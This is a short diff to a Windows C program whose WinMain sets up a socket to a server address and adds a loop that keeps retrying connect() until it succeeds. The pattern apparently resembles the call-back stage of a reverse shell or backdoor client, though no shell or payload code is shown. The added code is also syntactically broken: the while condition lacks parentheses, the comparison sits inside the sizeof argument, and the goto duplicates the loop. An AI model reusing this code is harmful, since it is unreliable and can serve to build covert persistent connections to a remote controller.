@@ -38,4 +38,11 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
   ServAddr.sin_family = AF_INET;
   ServAddr.sin_addr.s_addr = inet_addr(ServIP);
   ServAddr.sin_port = htons(ServPort);
+
+
+  start:
+  while connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr) != 0) {
+    Sleep(10);
+    goto start;
+  }
 }
